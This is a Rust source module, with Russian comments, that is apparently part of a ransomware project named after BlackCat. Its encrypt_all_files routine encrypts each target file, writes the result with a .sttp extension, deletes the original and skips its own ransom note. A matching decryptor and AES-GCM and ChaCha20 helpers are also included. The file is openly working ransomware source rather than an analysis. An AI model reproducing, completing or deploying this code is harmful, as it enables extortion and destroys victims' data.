use crate::crypto::CryptoEngine;
use serde::{Deserialize, Serialize};
use std::error::Error;
use aes_gcm::{Aes256Gcm, Nonce, Key, aead::Aead, KeyInit as AesKeyInit};
use chacha20poly1305::ChaCha20Poly1305;
use chacha20poly1305::KeyInit as ChaChaKeyInit;
use rand::Rng;
use std::fs; 

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RansomwareConfig {
    pub target_paths: Vec<String>,
    pub file_extensions: Vec<String>,
    pub encryption_algorithm: String,
    pub max_parallelism: usize,
}

pub struct BlackCatRansomware;

impl BlackCatRansomware {
    pub async fn encrypt_all_files(
        files: Vec<String>,
        _config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        for file in files {
            // Пропускаем саму записку, если она уже есть
            if file.contains("README_BLACKCAT.txt") { continue; }

            let content = fs::read(&file)?;
            let encrypted = crypto_engine.encrypt_aes_256(&content)?;
            
            // Новое имя файла с расширением .sttp
            let new_path = format!("{}.sttp", file);
            
            fs::write(&new_path, encrypted)?;
            fs::remove_file(&file)?; // Удаляем оригинал
        }
        Ok(())
    }

    pub async fn decrypt_all_files(
        files: Vec<String>,
        config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        let use_chacha20 = config.encryption_algorithm == "chacha20";
        for file in files {
            // ИСПРАВЛЕНИЕ: Дешифруем ТОЛЬКО файлы с расширением .sttp
            if !file.ends_with(".sttp") {
                continue;
            }

            let content = fs::read(&file)?;
            let decrypted = crypto_engine.decrypt_file(&content, use_chacha20)?;
            
            // Убираем расширение .sttp
            let original_path = file.trim_end_matches(".sttp").to_string();
            
            fs::write(&original_path, decrypted)?;
            fs::remove_file(&file)?; // Удаляем зашифрованную версию
        }
        Ok(())
    }
}

fn encrypt_with_aes256(plaintext: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, String> {
    let mut rng = rand::thread_rng();
    let mut nonce_array = [0u8; 12];
    rng.fill(&mut nonce_array);

    let aes_key = Key::<Aes256Gcm>::from(*key);
    let cipher = Aes256Gcm::new(&aes_key);
    let nonce = Nonce::from_slice(&nonce_array);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| e.to_string())?;

    let mut result = Vec::new();
    result.extend_from_slice(&nonce_array);
    result.extend_from_slice(&ciphertext);
    Ok(result)
}

fn encrypt_with_chacha20(plaintext: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, String> {
    let mut rng = rand::thread_rng();
    let mut nonce_array = [0u8; 12];
    rng.fill(&mut nonce_array);

    let chacha_key = Key::<ChaCha20Poly1305>::from(*key);
    let cipher = ChaCha20Poly1305::new(&chacha_key);
    let nonce = Nonce::from_slice(&nonce_array);

    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| e.to_string())?;

    let mut result = Vec::new();
    result.extend_from_slice(&nonce_array);
    result.extend_from_slice(&ciphertext);
    Ok(result)
}
